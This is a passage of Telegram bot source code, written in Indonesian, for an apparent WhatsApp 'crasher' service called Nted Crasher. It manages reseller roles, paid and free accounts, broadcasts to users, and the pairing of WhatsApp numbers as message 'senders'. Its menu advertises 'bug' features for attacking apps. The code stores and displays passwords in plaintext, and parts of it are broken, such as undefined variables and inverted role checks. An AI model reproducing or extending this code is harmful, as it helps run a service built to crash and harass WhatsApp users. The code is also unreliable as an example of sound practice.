  const targetRole = targetUser.role;
  if (isDeveloper(deleterId)) return true;
  if (isOwner(deleterId)) {
    if (targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isAdmin(deleterId)) {
    if (targetRole === 'admin' || targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isReseller(deleterId)) {
    return targetRole === 'member';
  }
  return false;
}
function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}
async function handleUserManagement(msg, input, type, action) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (type === 'staf' && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "🪄🍬 Khusus pemilik aplikasi!");
  }

  if (type === 'moderator' && !isDeveloper(userId) && !isVipStaf(userId)) {
    return bot.sendMessage(chatId, "🪄🍬 Khusus pemilik aplikasi!");
  }

  if (type === 'owner' && !isDeveloper(userId) && !isVipStaf(userId) && !isModerator(userId)) {
    return bot.sendMessage(chatId, "🪄🍬 Khusus pemilik aplikasi!");
  }

  if (type === 'patner' && !isDeveloper(userId) && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "🪄🍬 Khusus pemilik aplikasi!");
  }

  if (type === 'admin' && !isDeveloper(userId) && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId) && !isPatner(userId)) {
    return bot.sendMessage(chatId, "🚧 Khusus owner ke atas");
  }

  if (type === 'reseller' && !isDeveloper(userId) && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId) && !isPatner(userId) && !isAdmin(userId)) {
    return bot.sendMessage(chatId, "❌ No permission!");
  }

  let targetUser;
  let fullName = '';

  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from.id;
    fullName = [msg.reply_to_message.from.first_name, msg.reply_to_message.from.last_name].filter(Boolean).join(' ');
  } else if (input?.startsWith('@')) {
    try {
      const member = await bot.getChatMember(chatId, input);
      targetUser = member.user.id;
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      return bot.sendMessage(chatId, "❌ Username invalid!");
    }
  } else if (input && !isNaN(input)) {
    targetUser = Number(input);
    try {
      const member = await bot.getChatMember(chatId, targetUser);
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      fullName = targetUser.toString();
    }
  } else return;

  if (!fullName) fullName = targetUser.toString();

  const data = loadAdmins();
  const key = type === 'owner' ? 'owners'
           : type === 'moderator' ? 'moderators'
           : type === 'patner' ? 'patners'
           : type === 'admin' ? 'admins'
           : type === 'staf' ? 'stafs'
           : 'resellers';

  if (!Array.isArray(data[key])) data[key] = [];
  data[key] = data[key].map(id => Number(id));

  const isAdd = action.toLowerCase() === 'add';
  const exists = data[key].includes(targetUser);

  if ((isAdd && exists) || (!isAdd && !exists)) return;

  if (isAdd) {
    data[key].push(targetUser);
    console.log(`${type} added: ${targetUser} (${fullName})`);
  } else {
    data[key] = data[key].filter(id => id !== targetUser);
    console.log(`${type} removed: ${targetUser} (${fullName})`);
  }

  saveAdmins(data);

  bot.sendMessage(chatId, `\`\`\`js
🍬 Username: [${fullName}](tg://user?id=${targetUser})
✅ Success ${type.toUpperCase()} berhasil ${isAdd ? 'ditambahkan' : 'dihapus'}
\`\`\``, {
    parse_mode: 'Markdown',
    reply_to_message_id: msg.message_id
  });
}
bot.onText(/^\/(add|del)(staf|moderator|owner|patner|admin|reseller)\s*(.*)/i, async (msg, match) => {
  const action = match[1];
  const type = match[2];
  const input = match[3];
  await handleUserManagement(msg, input, type, action);
});
bot.onText(/^\/cek(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  let targetUser;

  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from;
  } else if (match[1]) {
    const arg = match[1].trim();
    if (/^\d+$/.test(arg)) {
      targetUser = await bot.getChatMember(chatId, arg).then(res => res.user).catch(() => null);
    } else if (arg.startsWith('@')) {
      targetUser = await bot.getChatMember(chatId, arg).then(res => res.user).catch(() => null);
    }
  } else {
    targetUser = msg.from;
  }

  if (!targetUser) {
    return bot.sendMessage(chatId, "❌ User tidak ditemukan.");
  }

  const userId = targetUser.id;
  const fullName = `${targetUser.first_name || ''} ${targetUser.last_name || ''}`.trim();
  const username = targetUser.username ? `@${targetUser.username}` : '-';
  const caption = `\`\`\`
🍥 NTED CRASHER DATABASE 🍬

╰─⊱ Informasi User ⊰─╯
╠□ Fullname: ${fullName}
╠□ Username: ${username}
╠□ UserId: ${userId}

╰─⊱ Role Access User ⊰─╯
╠□ Developer: ${isDeveloper(userId) ? "✔" : "✘"}
╠□ Owner: ${isOwner(userId) ? "✔" : "✘"}
╠□ Moderator: ${isModerator(userId) ? "✔" : "✘"}
╠□ Staf Vip: ${isVipStaf(userId) ? "✔" : "✘"}
╠□ Patner: ${isPatner(userId) ? "✔" : "✘"}
╠□ Admin: ${isAdmin(userId) ? "✔" : "✘"}
╠□ Reseller: ${isReseller(userId) ? "✔" : "✘"}

Ingin UP access ke lebih tinggi? silakan chat Owner di bawah ini
\`\`\``;

  await bot.sendPhoto(chatId, 'https://files.catbox.moe/tcfhpc.jpg', {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: 'Owner', url: 'https://t.me/NtedBitch' },
          { text: 'Channel', url: 'https://t.me/SenjuUpdateNew' }
        ]
      ]
    }
  });
});
const dbFile = './library/bc.json';
if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, JSON.stringify([]));

function AmbilUserjir() {
  return JSON.parse(fs.readFileSync(dbFile));
}

function SimpenUserJir(id) {
  const users = AmbilUserjir();
  if (!users.includes(id)) {
    users.push(id);
    fs.writeFileSync(dbFile, JSON.stringify(users, null, 2));
  }
}

bot.on('message', (msg) => {
  if (msg.from && msg.from.id) {
    SimpenUserJir(msg.from.id);
  }
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function kuk(id) {
  const owners = [8522032505];
  return owners.includes(id);
}
bot.onText(/^\/broadcast(?:\s+(.+))?/, async (msg, match) => {
  if (!kuk(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, '❌ Hanya admin bisa pakai fitur ini');
  }

  const users = AmbilUserjir();
  let success = 0, fail = 0;

  if (msg.reply_to_message) {
    for (const id of users) {
      try {
        await bot.copyMessage(id, msg.chat.id, msg.reply_to_message.message_id);
        success++;
        await delay(1000);
      } catch (err) {
        console.log(`Gagal kirim ke ${id}:`, err.message);
        fail++;
      }
    }
    return bot.sendMessage(msg.chat.id, `✅ Broadcast reply selesai\nBerhasil: ${success}\nGagal: ${fail}`);
  }

  const text = match[1];
  if (!text) {
    return bot.sendMessage(msg.chat.id, '⚠️ Masukkan pesan atau reply ke pesan untuk broadcast');
  }

  for (const id of users) {
    try {
      await bot.sendMessage(id, `🔥 Broadcast:\n${text}`);
      success++;
      await delay(1000);
    } catch (err) {
      console.log(`Gagal kirim ke ${id}:`, err.message);
      fail++;
    }
  }

  bot.sendMessage(msg.chat.id, `✅ Broadcast text selesai\nBerhasil: ${success}\nGagal: ${fail}`);
});
const Ntod = 8522032505; 
bot.onText(/\/backup/, (msg) => {
  if (msg.from.id !== Ntod) return bot.sendMessage(msg.chat.id, '❌ Hanya owner bisa pakai command ini');
  createBackup(bot, Ntod);
});
bot.onText(/\/fixerror/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply) {
    return bot.sendMessage(chatId, "❌ Reply ke kode atau file .js", { reply_to_message_id: msg.message_id });
  }

  let code = "";

  try {
    await bot.sendMessage(chatId, "Sedang memperbaiki code ⏳...", { reply_to_message_id: msg.message_id });

    if (reply.text) {
      code = reply.text;
    } else if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;

      const res = await axios.get(fileUrl);
      code = res.data;
    }

    if (!code) {
      return bot.sendMessage(chatId, "❌ Tidak ada kode!");
    }

    if (code.length > 5000) {
      return bot.sendMessage(chatId, "❌ Kode terlalu panjang!", { reply_to_message_id: msg.message_id });
    }

    const prompt = `apa yang salah pada kode berikut?\n${code}\ntolong perbaiki tanpa ada penjelasan`;

    const { data } = await axios.get("https://api.ikyyxd.my.id/tools/fixerror", {
      params: { code: prompt, lang: "javascript" },
      timeout: 30000
    });

    if (!data?.status || !data?.result?.fixed) {
      console.log("FIXERROR INVALID:", data);
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode!");
    }

    const fixed = data.result.fixed;
    const lang = reply.document?.file_name?.split(".").pop() || "javascript";

    if (fixed.length < 4000) {
      await bot.sendMessage(chatId, `✅ Fixed (${lang})\n\n\`\`\`${lang}\n${fixed}\n\`\`\``, { parse_mode: "Markdown" });
    } else {
      const filePath = path.join(__dirname, `fixed_${Date.now()}.js`);
      fs.writeFileSync(filePath, fixed);

      await bot.sendDocument(chatId, filePath, {}, { filename: `fixed.${lang}` });
      fs.unlinkSync(filePath);
    }

  } catch (err) {
    console.error("FIXERROR ERROR:", err.response?.data || err.message);
    bot.sendMessage(chatId, "❌ Terjadi error!", { reply_to_message_id: msg.message_id });
  }
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();
  const username = msg.from.username || fullName;

  let menuText = `<blockquote>𝐍𝐓𝐄𝐃 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄

╔─『 𝐍𝐭𝐞𝐝 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 』
│user: @${username}
│userid: ${userId}
│status: ${userStatus}
│
╠──────────────⊱
┃ New Update Nted Crasher
╠──────────────⊱
│⎙ New features apps bug
│⎙ New bug app view 
│⎙ Increase bug features 
│⎙ Increase tool features
│⎙ Using premium fire 
│⎙ Anti limit and dead
│⎙ Safer and more practical 
│⎙ Above average quality
╠──────────────⊱
┃Nted Crasher 2K24 - 20##
╚──────────────⊱
</blockquote>`;

  const opts = {
    caption: menuText,
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
         { text: '⎙ Account', callback_data: "acc_menu", style: "primary" },
         { text: '⎙ Other', callback_data: "other_ku", style: "danger" }
        ],
        [
         { text: '⿻ Owner', url: `https://t.me/NtedBitch`, style: "success" },
         { text: '⿻ Channel', url: `https://t.me/SenjuUpdateNew `, style: "success" }
        ]
      ]
    }
  };

  await bot.sendAnimation(chatId, 'https://files.catbox.moe/dx741d.mp4', opts);
  console.log(`Bot started by user: ${userId}`);
});

bot.onText(/\/pairing (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const number = match[1];
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }

  if (!number || !number.match(/^\d+$/)) {
    return bot.sendMessage(chatId, "⚠️ Usage: /pairing <number>\nContoh: /pairing 6281234567890");
  }

  try {
    const globalFolder = path.join('session', 'global');
    const sessionDir = path.join(globalFolder, number);

    if (!fs.existsSync(globalFolder)) fs.mkdirSync(globalFolder, { recursive: true });
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
       printQRInTerminal: false,
       syncFullHistory: true,
       markOnlineOnConnect: true,
       connectTimeoutMs: 60000,
       defaultQueryTimeoutMs: 0,
       keepAliveIntervalMs: 10000,
       generateHighQualityLinkPreview: true,
       version,
       browser: ["Ubuntu", "Chrome", "20.0.04"],
       logger: pino({ level: "silent" }),
       auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(
        state.keys,
        pino().child({ level: "silent", stream: "store" })
      ),
    },
  });

    await waiting(1000);
    let code = await sock.requestPairingCode(number, "NTED1234");

    if (code) {
      bot.sendMessage(
        chatId,
        `✅ Pairing code untuk ${number}: \`${code}\`\n\nGunakan kode ini di WhatsApp untuk pairing.`,
        { parse_mode: "Markdown" }
      );
    } else {
      bot.sendMessage(chatId, "❌ Gagal mendapatkan pairing code. Nomor ini mungkin sudah terdaftar.");
    }

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        globalConnections[number] = sock;
        console.log(`[🌐 GLOBAL] Sender ${number} ONLINE`);

        const senders = loadGlobalSenders();
        const idx = senders.findIndex(s => s.number === number);
        if (idx !== -1) {
          senders[idx].active = true;
          saveGlobalSenders(senders);
        }

        for (const ch of channels) {
          try {
            await sock.newsletterFollow(ch);
            console.log(`[🌐 GLOBAL] Sender ${number} berhasil join channel`);
          } catch (err) {
            console.error(`[🌐 GLOBAL] Gagal join channel:`, err);
          }
        }

      } else if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
        delete globalConnections[number];
        console.log(`[🌐 GLOBAL] Sender ${number} OFFLINE (${statusCode})`);

        if (isLoggedOut) {
          const senders = loadGlobalSenders().filter(s => s.number !== number);
          saveGlobalSenders(senders);
          console.log(`[🌐 GLOBAL] Sender ${number} dihapus karena logout.`);
        } else {
          console.log(`[🌐 GLOBAL] Reconnecting ${number}...`);
          await waiting(5000);
          await pairingGlobalWa(number, attempt + 1);
        }
      }
    });

    sock.ev.on("creds.update", saveCreds);
  } catch (err) {
    console.error("Pairing error:", err);
    bot.sendMessage(chatId, `⚠️ Error pairing: ${err.message}`);
  }
});

bot.onText(/^\/setrole (.+)?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isDeveloper(userId) && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk pakai command ini!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `<blockquote>❌ Format salah!

Contoh penggunaan:
<code>/setrole nted</code>
</blockquote>`, { parse_mode: "HTML" });
  }

  const username = match[1].trim();
  const users = loadDatabase();
  const user = users.find(u => u.username === username);

  if (!user) {
    return bot.sendMessage(chatId, `<blockquote>❌ User ${username} tidak ditemukan!

Contoh penggunaan:
<code>/setrole nted</code>
</blockquote>`, { parse_mode: "HTML" });
  }

  let inlineKeyboard = [];

  if (isDeveloper(userId)) {
    inlineKeyboard = [
      [{ text: 'Member', callback_data: `changerole_${username}_member`, style: "primary" }],
      [{ text: 'Reseller', callback_data: `changerole_${username}_reseller`, style: "primary" }],
      [{ text: 'Admin', callback_data: `changerole_${username}_admin`, style: "primary" }],
      [{ text: 'Patner', callback_data: `changerole_${username}_patner`, style: "primary" }],
      [{ text: 'Owner', callback_data: `changerole_${username}_owner`, style: "primary" }],
      [{ text: 'Moderator', callback_data: `changerole_${username}_moderator`, style: "primary" }],
      [{ text: 'Staf', callback_data: `changerole_${username}_staf`, style: "primary" }]
    ];
  } else if (isVipStaf(userId)) {
    inlineKeyboard = [
      [{ text: 'Member', callback_data: `changerole_${username}_member`, style: "primary" }],
      [{ text: 'Reseller', callback_data: `changerole_${username}_reseller`, style: "primary" }],
      [{ text: 'Admin', callback_data: `changerole_${username}_admin`, style: "primary" }],
      [{ text: 'Patner', callback_data: `changerole_${username}_patner`, style: "primary" }],
      [{ text: 'Owner', callback_data: `changerole_${username}_owner`, style: "primary" }],
      [{ text: 'Moderator', callback_data: `changerole_${username}_moderator`, style: "primary" }]
    ];
  } else if (isModerator(userId)) {
    inlineKeyboard = [
      [{ text: '🍬 Owner', callback_data: `changerole_${username}_owner`, style: "primary" }],
      [{ text: "🧸 Patner Akses", callback_data: `changerole_${username}_admin`, style: "success" }],
      [{ text: "🧬 Reseller Akses", callback_data: `changerole_${username}_reseller`, style: "success" }],
      [{ text: "💎 Member Akses", callback_data: `changerole_${username}_member`, style: "success" }]
    ];
  } else if (isOwner(userId)) {
    inlineKeyboard = [
      [{ text: "🧸 Patner Akses", callback_data: `changerole_${username}_admin`, style: "success" }],
      [{ text: "🧬 Reseller Akses", callback_data: `changerole_${username}_reseller`, style: "success" }],
      [{ text: "💎 Member Akses", callback_data: `changerole_${username}_member`, style: "success" }]
    ];
  } else if (PremGroup(chatId)) {
    inlineKeyboard = [
      [{ text: "💎 Member Akses", callback_data: `changerole_${username}_member`, style: "success" }]
    ];
  } else if (isReseller(userId)) {
    inlineKeyboard = [
      [{ text: "💎 Member Akses", callback_data: `changerole_${username}_member`, style: "success" }]
    ];
  }

  bot.sendMessage(chatId, `✏️ Pilih role baru untuk *${username}*`, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: inlineKeyboard }
  });
});

bot.onText(/^\/cekakun(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak punya izin untuk pakai command ini!");
  }

  const username = match && match[1] ? match[1].trim() : null;
  if (!username) {
    return bot.sendMessage(chatId, "❌ Format salah!\nGunakan: /cekakun <username>");
  }

  const users = loadDatabase() || [];
  const user = users.find(u => u.username === username);

  if (!user) {
    return bot.sendMessage(chatId, `❌ User ${username} tidak ditemukan!`);
  }

  const maskedPassword = user.password
    ? "*".repeat(user.password.length)
    : "❌ Tidak ada password";

  await bot.sendPhoto(chatId, 'https://files.catbox.moe/m338bo.jpg', {
    caption: `
<blockquote>
👤 Detail Akun: ${user.username}

┏──( ᴀᴋᴜɴ ᴀɴᴅᴀ )───⪩
│Role: ${user.role}
│Password: <code>${maskedPassword}</code>
│Expired: ${user.expiredDate}
┗────────────⪩
Gunakan akun dengan bijak
</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedBitch", style: "success" }],
        [
          { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew", style: "success" },
          { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic", style: "success" }
        ],
        [{ text: "🗑 Delete User", callback_data: `delete_${user.username}`, style: "danger" }]
      ]
    }
  });
});
bot.onText(/^\/setexpired (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1].split("|");
  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  
  if (msg.chat.type !== 'private') return;
  if (input.length < 2) {
    return bot.sendMessage(chatId, "Format: /setexpired username<±days\nExample: /setexpired nted|+7", { parse_mode: "Markdown" });
  }

  const [username, daysChange] = input.map(item => item.trim());
  const users = loadDatabase();
  const user = users.find(u => u.username === username);

  if (!user) {
    return bot.sendMessage(chatId, `❌ User ${username} tidak ditemukan!`);
  }

  const changeDays = parseInt(daysChange);
  if (isNaN(changeDays)) {
    return bot.sendMessage(chatId, "❌ Days must be a number with + or - sign!");
  }

  let expiryDate = new Date(user.expiredDate);
    if (isNaN(expiryDate)) {
    expiryDate = new Date();
   }
   expiryDate.setDate(expiryDate.getDate() + changeDays);
   user.expiredDate = expiryDate.toISOString().split("T")[0];
   saveDatabase(users);

  await bot.sendPhoto(chatId, 'https://files.catbox.moe/m338bo.jpg', {
    caption: `
<blockquote>
🔄 Expired akun berhasil diubah!

👤 Username: ${user.username}
📌 Role: ${user.role}
🔑 Password: <code>${user.password}</code>
📅 Expired Baru: ${user.expiredDate}
</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedBitch", style: "success" }],
        [
          { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew", style: "success" },
          { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic", style: "success" }
        ]
      ]
    }
  });
});
const CHANNELS = ["@TceSupportID", "@TceGroupChat"]
async function checkMembership(bot, chatId, userId, CHANNELS) {
  try {
    for (const channel of CHANNELS) {
      const member = await bot.getChatMember(channel, userId);
      if (!['member', 'administrator', 'creator'].includes(member.status)) {
        await bot.sendMessage(chatId, `<blockquote>🔐Your access is locked
Please join the channel below to open your access:

@TceSupportID
@TceGroupChat
</blockquote>`, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🧬 Channel Update", url: "https://t.me/TceSupportID" },
                { text: "🔮 Group Chat", url: "https://t.me/TceGroupChat" }
              ]
            ]
          }
        });
        return false;
      }
    }
    return true;
  } catch (err) {
    console.error(err);
    await bot.sendMessage(chatId, '⚠️ Error saat cek membership.');
    return false;
  }
}
const PREMIUM_GROUPS = [
  -1004446636668,
  -1004292905885
];

bot.onText(/^\/accperma (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1].split("|");
  const botUsers = readBotUsers();
  const existingUser = botUsers.find(u => u.telegramId === userId);
  const joined = await checkMembership(bot, chatId, userId, CHANNELS);

  if (!joined) return;

  if (!PREMIUM_GROUPS.includes(chatId)) {
    return bot.sendMessage(chatId, "❌ Group ini bukan premium, command hanya bisa dipakai di group premium.");
  }
  if (existingUser) {
    return bot.sendMessage(userId, "🚧⚡ Masa pakai kamu telah habis, setiap user hanya memiliki 1x create saja!");
  }
  
  if (input.length < 2) {
    return bot.sendMessage(chatId, `<blockquote>❌ Incorrect format, the correct one is

Example: /accperma username|password
Contoh: <code>/accperma nted|mypassword</code>

ingat setiap user hanya bisa sekali pakai doang, jadi kamu harus benar
</blockquote>`, { parse_mode: "HTML" });
  }

  const [username, password] = input;
  const role = "member";
  const expiryDays = 50000;
  const users = loadDatabase();
  let user = users.find(u => u.username === username);

  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + expiryDays);

  if (!user) {
    user = {
      username,
      password,
      role,
      expiredDate: expiryDate.toISOString().split("T")[0],
      status: "Active",
      requesterId: userId
    };
    users.push(user);
  } else {
    user.password = password;
    user.role = role;
    user.expiredDate = expiryDate.toISOString().split("T")[0];
    user.status = "Active";
    user.requesterId = userId;
  }

  saveDatabase(users);

  botUsers.push({ telegramId: userId, createdAt: new Date().toISOString() });
  saveBotUsers(botUsers);

  if (msg.chat.type === "group" || msg.chat.type === "supergroup") {
    await bot.sendMessage(chatId, `✅ Account untuk @${msg.from.username || userId} sudah dikirim ke private chat.`);
  }

  await bot.sendPhoto(userId, 'https://files.catbox.moe/m338bo.jpg', {
    caption: `
<blockquote>✅ Success, here is your account data:

📄 Your Account Data
👤 Username: ${username}
🔐 Password: <code>${password}</code>
🧬 Role Acc: ${role}
📆 Expired: ${expiryDate.toISOString().split('T')[0]}

⚡ For security reasons:
Simpan data ini dengan baik agar kamu bisa pakai selamanya, dan jangan sampai ilang, karna kamu hanya bisa create 1x
</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "⌜ Copy User ⌟", copy_text: { text: `${username}` } }],
        [{ text: "⌜ Copy Key ⌟", copy_text: { text: `${password}` } }],
        [
          { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" },
          { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }
        ]
      ]
    }
  });
});
bot.onText(/^\/freeacc (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1].split("|");
  const botUsers = readBotUsers();
  const existingUser = botUsers.find(u => u.telegramId === userId);
  const joined = await checkMembership(bot, chatId, userId, CHANNELS);
  
  if (!joined) return;
  
  if (existingUser) {
    return bot.sendMessage(userId, "🚧⚡ Masa pakai kamu telah habis, setiap user hanya memiliki 1x create saja!");
  }
  if (input.length < 2) {
    return bot.sendMessage(chatId, `<blockquote>❌ Incorrect format, the correct one is

Example: /freeacc username|password
Contoh: <code>/freeacc nted|mypassword</code>

inget setiap user hanya bisa sekali pakai doang, jadi kamu harus benar
</blockquote>`, { parse_mode: "HTML" });
  }

  const [username, password] = input;
  const role = "member";
  const expiryDays = 3;
  const users = loadDatabase();
  let user = users.find(u => u.username === username);

  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + expiryDays);

  if (!user) {
    user = {
      username,
      password,
      role,
      expiredDate: expiryDate.toISOString().split("T")[0],
      status: "Active",
      requesterId: userId
    };
    users.push(user);
  } else {
    user.password = password;
    user.role = role;
    user.expiredDate = expiryDate.toISOString().split("T")[0];
    user.status = "Active";
    user.requesterId = userId;
  }

  saveDatabase(users);

  botUsers.push({ telegramId: userId, createdAt: new Date().toISOString() });
  saveBotUsers(botUsers);

  if (msg.chat.type === "group" || msg.chat.type === "supergroup") {
    await bot.sendMessage(chatId, `✅ Account untuk @${msg.from.username || userId} sudah dikirim ke private chat.`);
  }

  await bot.sendPhoto(userId, 'https://files.catbox.moe/m338bo.jpg', {
    caption: `
<blockquote>✅ Success, here is your account data:

📄 Your Account Data
👤 Username: ${username}
🔐 Password: <code>${password}</code>
🧬 Role Acc: ${role}
📆 Expired: ${expiryDate.toISOString().split('T')[0]}

⚡ For security reasons:
Simpan data ini dengan baik agar kamu bisa pakai selamanya, dan jangan sampai ilang, karna kamu hanya bisa create 1x
</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "⌜ Copy User ⌟", copy_text: { text: `${username}` } }],
        [{ text: "⌜ Copy Key ⌟", copy_text: { text: `${password}` } }],
        [
          { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew" },
          { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic" }
        ]
      ]
    }
  });
});

bot.onText(/^\/cakun (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const input = match[1].split("|");
  const joined = await checkMembership(bot, chatId, userId, CHANNELS);
  
  if (!joined) return;
  
  if (!hasAccess(userId, chatId)) {
    return bot.sendMessage(chatId, "Kamu tidak punya akses untuk bot ini");
  }

  if (input.length < 2) {
    return bot.sendMessage(chatId, `<blockquote>❌ Incorrect format, the correct one is

Example: /cakun username|expiry
Contoh: <code>/cakun nted|30</code>
</blockquote>`, { parse_mode: "HTML" });
  }

  const [username, expiry] = input.map(item => item.trim());
  const password = username + Math.floor(Math.random() * 1000);
  const users = loadDatabase();
  const expiryDays = parseInt(expiry);

  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "❌ Expiry must be a number!");
  }
  if (users.find(u => u.username === username)) {
    return bot.sendMessage(chatId, "❌ Username sudah ada!");
  }

  let inlineKeyboard = { inline_keyboard: [] };

   if (isDeveloper(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Reseller', callback_data: `cakun_${username}_reseller_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Admin', callback_data: `cakun_${username}_admin_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Patner', callback_data: `cakun_${username}_patner_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Owner', callback_data: `cakun_${username}_owner_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Moderator', callback_data: `cakun_${username}_moderator_${expiry}_${password}`, style: "primary" }],
      [{ text: 'Staf', callback_data: `cakun_${username}_staf_${expiry}_${password}`, style: "primary" }]
     ];
  } else if (!isVipStaf(userId) && !isDeveloper(userId)) {
     inlineKeyboard.inline_keyboard = [
      [{ text: ' 🍬 Member', callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧬 Reseller', callback_data: `cakun_${username}_reseller_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧩 Admin', callback_data: `cakun_${username}_admin_${expiry}_${password}`, style: "primary" }],
      [{ text: '🍡 Patner', callback_data: `cakun_${username}_patner_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧸 Owner', callback_data: `cakun_${username}_owner_${expiry}_${password}`, style: "primary" }]
     ];
   } else if (!isVipStaf(userId) && !isModerator(userId)) {
     inlineKeyboard.inline_keyboard = [
      [{ text: ' 🍬 Member', callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧬 Reseller', callback_data: `cakun_${username}_reseller_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧩 Admin', callback_data: `cakun_${username}_admin_${expiry}_${password}`, style: "primary" }],
      [{ text: '🍡 Patner', callback_data: `cakun_${username}_patner_${expiry}_${password}`, style: "primary" }],
      [{ text: '🧸 Owner', callback_data: `cakun_${username}_owner_${expiry}_${password}`, style: "primary" }]
     ];
   } else if (!isVipStaf(userId) && !isModerator(userId) && !isOwner(userId)) {
      inlineKeyboard.inline_keyboard = [
       [{ text: '🧩 Admin', callback_data: `cakun_${username}_admin_${expiry}_${password}`, style: "success" }],
       [{ text: "🧸 Patner", callback_data: `cakun_${username}_patner_${expiry}_${password}`, style: "success" }],
       [{ text: "🧬 Reseller", callback_data: `cakun_${username}_reseller_${expiry}_${password}`, style: "success" }],
       [{ text: "💎 Member", callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "success" }]
      ];
    } else if (!isVipStaf(userId) && !isModerator(userId) && !isOwner(userId) && !isPatner(userId)) {
       inlineKeyboard.inline_keyboard = [
        [{ text: '🧩 Admin', callback_data: `cakun_${username}_admin_${expiry}_${password}`, style: "success" }],
